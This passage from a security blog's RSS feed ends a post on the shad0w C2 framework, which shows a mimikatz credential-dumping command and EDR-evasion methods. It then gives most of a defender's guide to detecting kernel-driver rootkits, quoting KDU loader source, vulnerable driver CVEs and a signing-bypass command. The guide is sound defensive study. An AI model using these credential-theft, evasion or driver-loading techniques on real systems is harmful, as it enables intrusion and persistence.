&lt;p&gt;If an exploit is successful you will receive a new session from a beacon with elevate privileges&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/elevate_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Modules&lt;span class=&#34;absolute -mt-20&#34; id=&#34;modules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#modules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As I previously said, shad0w is designed to be very modular making the creation of new modules not much of a challenge. To showcase this I&amp;rsquo;ve added a mimikatz module. It will be executed inside memory like any module you decide to run but it should never be run over a secure beacon. This is because by design mimikatz is not very operationally secure so any half decent EDR should catch it very quickly. It is very much a welcome addition to the insecure beacons though.&lt;/p&gt;
&lt;p&gt;This module can be used with the &lt;code&gt;mimikatz&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ mimikatz -x sekurlsa::logonpasswords&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Any other mimikatz commands can also by run by using the &lt;code&gt;-x&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mimikatz_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Defenses&lt;span class=&#34;absolute -mt-20&#34; id=&#34;defenses&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#defenses&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In future blog posts I will be going into a lot more detail into how these defenses work in the secure beacon - but here&amp;rsquo;s a quick overview.&lt;/p&gt;
&lt;p&gt;Currently shad0w uses 3 main defences:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dynamic in memory code execution&lt;/li&gt;
&lt;li&gt;Directly using syscalls&lt;/li&gt;
&lt;li&gt;Anti DLL injection&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Dynamic in memory code execution&lt;span class=&#34;absolute -mt-20&#34; id=&#34;dynamic-in-memory-code-execution&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#dynamic-in-memory-code-execution&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This is achieved by safely hijacking alertable threads in a running processes and injecting the modules directly into them. This can help to avoid Sysmon&amp;rsquo;s event ID 8, which can be used to detect process injection.&lt;/p&gt;
&lt;h3&gt;Directly using syscalls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;directly-using-syscalls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#directly-using-syscalls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By directly using native windows syscalls, shad0w is able to avoid any userland API hooks placed by EDR solutions. This will greatly reduce their ability to monitor shad0w.&lt;/p&gt;
&lt;h3&gt;Anti DLL injection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;anti-dll-injection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#anti-dll-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The main method EDR solutions use to hook and monitor programs is by injecting a DLL into running processes allowing them to watch the inner workings of a program. This is currently combated by two methods: enforcing that only Microsoft signed DLLs are allowed into child processes (not many EDR DLLs are signed by Microsoft) and also by maintaining a whitelist of DLLs that are allowed into processes and blocking all others. This ensures that even if a DLL is signed by Microsoft it will still not be able to enter any of the processes.&lt;/p&gt;
&lt;h2&gt;Stay Up To Date&lt;span class=&#34;absolute -mt-20&#34; id=&#34;stay-up-to-date&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#stay-up-to-date&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This is a constantly evolving project under active development. There are lots of exciting new features going to be added over the coming weeks so make sure you stay up to date with the lastest changes on this project&amp;rsquo;s &lt;a href=&#34;https://github.com/bats3c/shad0w/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>A Defender’s Guide For Rootkit Detection: Episode 1 - Kernel Drivers</title>
      <link>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</link>
      <pubDate>Mon, 20 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</guid>
      <description>
        
        
        &lt;p&gt;&lt;em&gt;Author: Thom (&lt;/em&gt;&lt;a href=&#34;https://twitter.com/rootkid8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;@rootkid8&lt;/em&gt;&lt;/a&gt;&lt;em&gt;), Sysmon Mastery Help from Rana (&lt;a href=&#34;https://twitter.com/sec_coffee&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@sec_coffee&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Even before my birth, rootkits have been one of the most sophisticated and successful ways of obtaining persistence on a machine, and now in 2020 there are ever more trivial ways of escalating from system to kernel. Recently JUMPSEC’s youngest red team researcher &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; &lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;raised the bar once more using rootkit techniques to universally evade Sysmon&lt;/a&gt;. This method of defeating Event Tracing for Windows is an incredible feat and the world of Windows logging is left shaken. As a result, we’re going to go down the rabbit hole of kernel driver rootkits, specifically looking at the use of vulnerable kernel drivers to escalate to ring-zero. First we need to start with some basics, how the Windows kernel implements defence-in-depth, how to bypass these restrictions, and how network defenders and system administrators can detect these techniques as “trivially” as attackers can implement them (skip to the end for a Sysmon Config). &lt;/p&gt;
&lt;h2&gt;Some OS Basics&lt;span class=&#34;absolute -mt-20&#34; id=&#34;some-os-basics&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#some-os-basics&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;For those of us who don&amp;rsquo;t know, operating systems and common CPU&amp;rsquo;s define hierarchical protection domains to implement defense in depth. Code executing on the CPU is run in one of these rings using CPU modes - with ring 3 being user-land and ring 0 being kernel-land. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-16-090738_677x477_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Only certain applications that require access to low level devices and hardware should be allowed access to run code in rings 2, 1 and 0, which is enforced at a microcode level on the CPU as well as by the operating system. In theory this privilege domain is sound, and its introduction expelled the days of causing total system crashes with one line of buggy code in user-land. However, the implementation of these rings at the operating system level, and worse-so at the driver level is reasonably vague and undocumented, opening up an entire space for kernel driver exploits as post exploitation privilege escalation and persistence mechanisms. &lt;/p&gt;
&lt;h2&gt;Writing a Kernel Mode Driver&lt;span class=&#34;absolute -mt-20&#34; id=&#34;writing-a-kernel-mode-driver&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#writing-a-kernel-mode-driver&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We’re going to look more closely at how Windows handles device drivers, since these drivers allow access to kernel space, we will hopefully uncover some of the ways to get arbitrary code to run in kernel mode without the use of a signed driver. Heck, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;writing a kernel mode driver isn’t a particularly challenging task&lt;/a&gt;, but if you want it to run on a target system it will require setting up “Test Mode” on the operating system or completely disabling device driver signing enforcement (DSE) globally which requires access to the boot settings, or through running the following command followed by a reboot:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;bcdedit /set testsigning on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Both of these techniques are about as stealthy as using a sledgehammer to hide the noise of your power drill, and not only will most ordinary users recognise the &lt;strong&gt;Test Mode&lt;/strong&gt; warning on their device, many organisations restrict this functionality group wide, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;and if they don’t then they really should.&lt;/a&gt; There is of course a way to hide the watermarks and warnings, but again this is a sledgehammer approach since bcdedit will be caught by a blue team with any real level of sophistication.&lt;/p&gt;
&lt;p&gt;Instead, we need to bypass Driver Signature Enforcement and PatchGuard, both of which being Windows kernel protection mechanisms. One to prevent unsigned drivers being loaded and another to prevent drivers from modifying critical kernel data structures through integrity checks. Again, any blue team should be able to detect the loading of a driver with an expired certificate - &lt;a href=&#34;https://github.com/SwiftOnSecurity/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SwiftOnSecurity’s handy Sysmon config will anyway!&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;The Story of One Kernel Driver Loader&amp;hellip;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-story-of-one-kernel-driver-loader&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-story-of-one-kernel-driver-loader&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to explore these kernel mode drivers, we need to take a trip back in time. There used to be (and still are) some fantastic base projects for kernel mode drivers like the ones we’re investigating. Written by a legend in this space &lt;a href=&#34;https://twitter.com/hfiref0x?lang=en&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt; - we’ll start with &lt;a href=&#34;https://github.com/hfiref0x/TDL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;TDL or Turla Driver Loader&lt;/a&gt;. Around 4 years ago, this tool was a rootkit developer&amp;rsquo;s wet dream. It’s the supercedent to &lt;a href=&#34;https://github.com/hfiref0x/DSEFix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DSEFix&lt;/a&gt;, another driver loader written by hfiref0x, that became obsolete due to its modification of kernel variables that got blocked by PatchGuard rendering it a guaranteed blue screen generator - a fun prank but not what we’re looking for. &lt;/p&gt;
&lt;p&gt;TDL acts as a fully functional driver loader that can be used independently of the Windows loader. As a byproduct it defeats 64-bit driver signature enforcement as well. The magic of Turla is the offensive technique it uses to get a custom driver to load into kernel memory. It comes packaged with a vulnerable version of a VirtualBox kernel mode driver, it loads and exploits this driver to overwrite kernel memory with a custom crafted driver before jumping to the DriverEntry function to begin execution. Effectively this can be visualised as so:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Rootkits.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This technique is somewhat akin to process hollowing, but instead of creating a suspended thread and mapping our code into it, we load a known driver and use shellcode to map our malicious code into that segment of memory.&lt;/p&gt;
&lt;p&gt;The technique is surprisingly simple, but extremely effective. Since the VirtualBox driver runs in kernel mode already, by dropping shellcode that now runs in kernel land we can execute an mmov, an mmap, and a jump (in reality it’s much more complex than that but just for simplicity’s sake we rely on those three instructions). This means that all the target kernel driver needs is permission to read and write physical memory, and have a code execution CVE for it to become a candidate for kernel driver loading.&lt;/p&gt;
&lt;p&gt;Clearly hfiref0x doesn’t sleep, and soon after TDL, &lt;a href=&#34;https://github.com/hfiref0x/Stryker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Stryker&lt;/a&gt; was released, yet another kernel driver loader. This time the loader was crafted to &lt;a href=&#34;https://www.cpuid.com/softwares/cpu-z.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;exploit a CPU-Z driver&lt;/a&gt; instead, functioning very similarly to its predecessor. Now again in 2020,  hfiref0x strikes again with the release of Kernel Driver Utility (&lt;a href=&#34;https://github.com/hfiref0x/KDU&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;KDU&lt;/a&gt;) just 2 months ago, the same concept is being used, except now KDU supports multiple vulnerable drivers as “functionality providers&amp;rsquo;&amp;rsquo;. Hilariously named, these functionality providers are the keys to the kingdom, and if we have any hopes of detecting rootkits that use this technique we need to understand how KDU loads these drivers, how it exploits them, and what breadcrumbs we can search for on systems to check for compromise.&lt;/p&gt;
&lt;p&gt;Looking briefly at the Github attributes we can see there are 4 CVE’s associated with the project:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2291&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2015-2291&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- IQVW32.sys intel ethernet driver vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-18845&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- MsIo64.sys and MsIo32.sys Patriot Viper vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2018-19320&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- GDrv graphics driver vulnerability &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-16098&lt;/a&gt; - RTCore64.sys and RTCore32.sys vulnerability&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With more providers mentioned in the README:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ATSZIO64 driver from ASUSTeK WinFlash utility of various versions;&lt;/li&gt;
&lt;li&gt;GLCKIO2 (WinIo) driver from ASRock Polychrome RGB of version 1.0.4;&lt;/li&gt;
&lt;li&gt;EneIo (WinIo) driver from G.SKILL Trident Z Lighting Control of version 1.00.08;&lt;/li&gt;
&lt;li&gt;WinRing0x64 driver from EVGA Precision X1 of version 1.0.2.0;&lt;/li&gt;
&lt;li&gt;EneTechIo (WinIo) driver from Thermaltake TOUGHRAM software of version 1.0.3.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The most notable thing regarding these vulnerabilities is that they all expose ring-zero code execution capabilities, enabling the entire kill-chain of KDU. Even more interestingly  CVE-2019-16098 even states in the description: &lt;strong&gt;&lt;em&gt;These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;As a disclaimer, we can note that hfiref0x states KDU and all similar tools are not actually hacking tools, they are for driver developers to make their lives easier. &lt;strong&gt;A lazy AV will flag this tool as malware&lt;/strong&gt;, but also because in many senses of the word, KDU is malware in the same way a remote access tool for sysadmins can be malware.&lt;/p&gt;
&lt;h2&gt;Static Analysis &lt;span class=&#34;absolute -mt-20&#34; id=&#34;static-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#static-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;[WARNING: RABBIT HOLE AHEAD]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;If you’re not interested in KDU source code or boring operating system details then skip to Dynamic Analysis.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Examining the source code of KDU we see an abstraction layer that is implemented by the driver loader, each provider has the following structure:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;144 typedef struct _KDU_PROVIDER {                          
…………………………………………………
161     struct {
162         provRegisterDriver RegisterDriver; //optional
163         provUnregisterDriver UnregisterDriver; //optional
164
165         provAllocateKernelVM AllocateKernelVM; //optional
166         provFreeKernelVM FreeKernelVM; //optional
167
168         provReadKernelVM ReadKernelVM;
169         provWriteKernelVM WriteKernelVM;
170
171         provVirtualToPhysical VirtualToPhysical; //optional
172         provReadControlRegister ReadControlRegister; //optional
173     
174         provQueryPML4 QueryPML4Value; //optional
175         provReadPhysicalMemory ReadPhysicalMemory; //optional
176         provWritePhysicalMemory WritePhysicalMemory; //optional
177     } Callbacks;
178 } KDU_PROVIDER, * PKDU_PROVIDER;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I’ve ignored the unimportant fields, but from here we can understand what it takes to construct a provider, and we can see there are function pointers required for:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reading and writing virtual memory, &lt;/li&gt;
&lt;li&gt;mapping virtual addresses to physical addresses, &lt;/li&gt;
&lt;li&gt;reading and writing physical addresses &lt;/li&gt;
&lt;li&gt;reading two kernel registers - the PML4 and the Control Register&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It should be pretty clear so far why we need to be able to read and write physical and virtual memory addresses, but what are the PML4 and the control register and why does the exploit require them? Well if you’re familiar with Linux kernels then the PML4 is simply the base address to the multi-level page table that the kernel uses to map linear virtual address spaces to processes. In order to replace our driver in memory we need to be able to find where it’s stored in memory which requires reading from the page table to find the address space of the target driver. Hence we can read this base address from the PML4 register. &lt;/p&gt;
&lt;p&gt;The control register should also be familiar to kernel developers or assembly folks, but to those of you who don’t know - it’s a 64-bit register that has a few important use cases required by virtual memory mapping and paging. In cases where either no function is defined for mapping virtual memory to physical memory, and nothing for reading the PML4, KDU uses the control register value to find the page directory address. This allows it to translate virtual addresses to physical addresses so it can walk through the page table and overwrite physical kernel memory regions:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 39  BOOL PwVirtualToPhysical(
 40     _In_ HANDLE DeviceHandle,
 41     _In_ provQueryPML4 QueryPML4Routine,
 42     _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine,
 43     _In_ ULONG_PTR VirtualAddress,
 44     _Out_ ULONG_PTR* PhysicalAddress)
 45 {   
 46     ULONG_PTR   pml4_cr3, selector, table, entry = 0;
 47     INT         r, shift;
 48     
 49     *PhysicalAddress = 0;
 50     
 51     if (QueryPML4Routine(DeviceHandle, &amp;amp;pml4_cr3) == 0)
 52         return 0;
 53     
 54     table = pml4_cr3 &amp;amp; PHY_ADDRESS_MASK;
 55     
 56     for (r = 0; r &amp;lt; 4; r&amp;#43;&amp;#43;) {
 57         
 58         shift = 39 - (r * 9);
 59         selector = (VirtualAddress &amp;gt;&amp;gt; shift) &amp;amp; 0x1ff;
 60         
 61         if (ReadPhysicalMemoryRoutine(DeviceHandle,
 62             table &amp;#43; selector * 8,
 63             &amp;amp;entry,
 64             sizeof(ULONG_PTR)) == 0)
 65         {   
 66             return 0;
 67         }
 68         
 69         if (PwEntryToPhyAddr(entry, &amp;amp;table) == 0)
 70             return 0;
 71         
 72         if ((r == 2) &amp;amp;&amp;amp; ((entry &amp;amp; ENTRY_PAGE_SIZE_BIT) != 0)) {
 73             table &amp;amp;= PHY_ADDRESS_MASK_2MB_PAGES;
 74             table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_2MB_PAGES;
 75             *PhysicalAddress = table;
 76             return 1;
 77         }
 78     }
 79     
 80     table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_4KB_PAGES;
 81     *PhysicalAddress = table;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Digging deeper into the source code we actually discover that there are two drivers at play here: a victim driver and a vulnerable driver. Initially I presumed these to be the same driver, but the code appears to unpack, load and start the vulnerable driver first - this is the &lt;em&gt;provider&lt;/em&gt; - after which it calls KDUMapDriver which tries to load the victim driver.&lt;/p&gt;
&lt;p&gt;In the case of KDU, the victim driver is always the process explorer &lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys driver, it bootstraps shellcode into the IRP_MJ_DEVICE_CONTROL callback of PROCEXP152, before finally unloading it, triggering the shellcode to execute inside PROCEXP152, allowing the target driver to be loaded into kernel memory.&lt;/p&gt;
&lt;p&gt;Finally, let’s take a look at the core loader functionality, we want to understand the shellcode bootstrapping, and the system calls used to help us figure out what level of detection is possible. This snippet of code is where the bootstrapping happens inside KDUSetupShellCode:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;382         //
383         // Resolve import (ntoskrnl only) and write buffer to registry.
384         //
385         isz = FileHeader-&amp;gt;OptionalHeader.SizeOfImage;
386
387         DataBuffer = supHeapAlloc(isz);
388         if (DataBuffer) {
389             RtlCopyMemory(DataBuffer, Image, isz);
390
391             printf_s(&amp;#34;[&amp;#43;] Resolving kernel import for input driverrn&amp;#34;);
392             supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);
393             
394             lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &amp;amp;hKey);
395             if ((lResult == ERROR_SUCCESS) &amp;amp;&amp;amp; (hKey != NULL)) {
396
397                 lResult = RegSetKeyValue(hKey, NULL, TEXT(&amp;#34;~&amp;#34;), REG_BINARY,                                        
398                     DataBuffer, isz);
399
400                 bSuccess = (lResult == ERROR_SUCCESS);
401
402                 RegCloseKey(hKey);
403             }
404             supHeapFree(DataBuffer);
405         }
406     }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;We see that first it finds the &lt;code&gt;**ntoskrnl**.exe&lt;/code&gt; base address - this is the starting address space of the kernel mapped memory region, containing important structures such as the page directory of mapped memory for all processes on the system. This is important because most process monitoring tools should be able to detect if this image is loaded. After this it calls &lt;code&gt;KDUStorePayload&lt;/code&gt; on the driver filename passed to it - interestingly this function writes a byte buffer that is just the raw bytes of the &lt;strong&gt;&lt;code&gt;rootkit.sys&lt;/code&gt;&lt;/strong&gt; &lt;em&gt;(or whatever input kernel mode driver you specify)&lt;/em&gt; to a registry hive in &lt;code&gt;HKLM&lt;/code&gt; with the key “~”:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-15-115900_749x165_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;[&lt;code&gt;4d5a&lt;/code&gt; is hex for &lt;code&gt;MZ&lt;/code&gt; also known as the magic bytes in the header of a PE image.]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A fun part of this registry write is that KDU doesn’t clean up after itself so this artifact remains on the system as an IOC even after KDU’s removal. I’ve thrown together a little powershell script that you can find in the appendix for incident responders to check whether any PE data has been written to registry keys. It will detect KDU in it’s default state as well as any basic attempts at KDU modifications that change the target hive, and any other tools that write executable data to the registry.&lt;/p&gt;
&lt;p&gt;Furthermore, we come across this function call inside &lt;code&gt;VictimBuildName&lt;/code&gt; in &lt;code&gt;**victim**.cpp&lt;/code&gt; that writes the victim driver &lt;strong&gt;&lt;code&gt;.sys&lt;/code&gt;&lt;/strong&gt; in the &lt;code&gt;%TEMP%&lt;/code&gt; directory:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 61 LPWSTR VictimBuildName(
 62     _In_ LPWSTR VictimName
 63 )
 64 {
 65     LPWSTR FileName;
 66     SIZE_T Length = (1024 &amp;#43; _strlen(VictimName)) * sizeof(WCHAR);
 67
 68     FileName = (LPWSTR)supHeapAlloc(Length);
 69     if (FileName == NULL) {
 70         SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 71     }
 72     else {
 73
 74         DWORD cch = supExpandEnvironmentStrings(L&amp;#34;%temp%\&amp;#34;, FileName, MAX_PATH);
 75         if (cch == 0 || cch &amp;gt; MAX_PATH) {
 76             SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 77             supHeapFree(FileName);
 78             FileName = NULL;
 79         }
 80         else {
 81             _strcat(FileName, VictimName);
 82             _strcat(FileName, L&amp;#34;.sys&amp;#34;);
 83         }
 84     }
 85
 86     return FileName;
 87 }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
